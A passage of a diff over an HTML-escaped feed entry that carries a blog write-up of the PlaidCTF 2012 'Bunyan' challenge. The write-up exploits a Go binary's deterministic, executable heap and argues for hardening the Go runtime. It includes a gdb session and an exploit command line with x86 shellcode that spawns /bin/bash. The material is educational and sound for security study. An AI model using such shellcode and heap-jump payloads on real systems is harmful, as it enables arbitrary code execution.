+&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
 &lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
-&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (&lt;span class="caps"&gt;LWP&lt;/span&gt; 7869)]&lt;/span&gt;
-&lt;span class="go"&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;       1Listening on :&lt;span class="caps"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;&lt;/span&gt;
+&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
+&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
 
 &lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
 &lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
@@ -261,10 +261,10 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:&lt;span class="caps"&gt;AAAA&lt;/span&gt;&amp;#8230;&lt;span class="caps"&gt;AAAABBBB&lt;/span&gt;&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to&amp;nbsp;it.&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="caps"&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
-&lt;span class="go"&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;       1Listening on :j&lt;/span&gt;
-&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½&lt;span class="caps"&gt;RQS&lt;/span&gt;ï¿½ï¿½Í€&lt;span class="caps"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;Íƒ&lt;/span&gt;
+&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
+&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
 &lt;span class="gp"&gt;$&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -274,36 +274,36 @@ Success!
 &lt;/p&gt;
 &lt;h3&gt;Postmortem&lt;/h3&gt;
 &lt;p&gt;
-This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code&amp;nbsp;execution.
+This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
 &lt;/p&gt;&lt;/p&gt;
 &lt;p&gt;
-It is also important to note that, while the vulnerability is introduced through C code, common C protections such as &lt;span class="caps"&gt;NX&lt;/span&gt;, &lt;span class="caps"&gt;ASLR&lt;/span&gt;, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming &lt;span class="caps"&gt;ASLR&lt;/span&gt;, &lt;span class="caps"&gt;NX&lt;/span&gt;, and libc&amp;nbsp;randomization.
+It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
 &lt;/p&gt;
 
 &lt;p&gt;
-I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the&amp;nbsp;binary. 
+I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
 &lt;/p&gt;
 
-&lt;h3&gt;Go Community&amp;nbsp;Response&lt;/h3&gt;
+&lt;h3&gt;Go Community Response&lt;/h3&gt;
 
 &lt;p&gt;
-For anyone who is interested, the Go community&amp;#8217;s response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding &lt;span class="caps"&gt;ASLR&lt;/span&gt; or &lt;span class="caps"&gt;NX&lt;/span&gt; would not require very much&amp;nbsp;effort.
+For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
 &lt;/p&gt;
 
-&lt;h3&gt;Other&amp;nbsp;writeups&lt;/h3&gt;
+&lt;h3&gt;Other writeups&lt;/h3&gt;
 
 &lt;p&gt;
 There are writeups of this problem available by:
 &lt;ul&gt;
-    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc&amp;nbsp;exploit)&lt;/li&gt;
-    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in&amp;nbsp;French)&lt;/li&gt;
+    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
+    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/p&gt;
 
 &lt;h3&gt;tl;dr&lt;/h3&gt;
 
 &lt;p&gt;
-Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively&amp;nbsp;straightforward.
+Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
 &lt;/p&gt;
 
 &lt;p&gt;&lt;span style="display:none;"&gt;Writeup by Alex Reece, see me on &lt;a href="https://plus.google.com/106589059588263736517?rel=author"&gt;Google&lt;/a&gt;+.&lt;/span&gt; &lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry></feed>
